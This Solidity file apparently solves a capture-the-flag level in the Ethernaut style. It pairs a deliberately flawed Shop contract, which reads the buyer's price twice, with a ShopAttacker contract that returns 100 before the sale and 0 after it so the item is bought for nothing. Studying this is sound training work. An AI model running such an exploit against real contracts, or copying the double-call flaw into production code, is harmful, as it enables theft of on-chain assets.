// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopAttacker is Buyer {
    Shop public s;

    constructor(Shop _s) public {
        s = _s;
    }

    function buy() public {
        s.buy();
    }

    function price() public view override returns (uint) {
        return s.isSold() ? 0 : 100;
    }
}
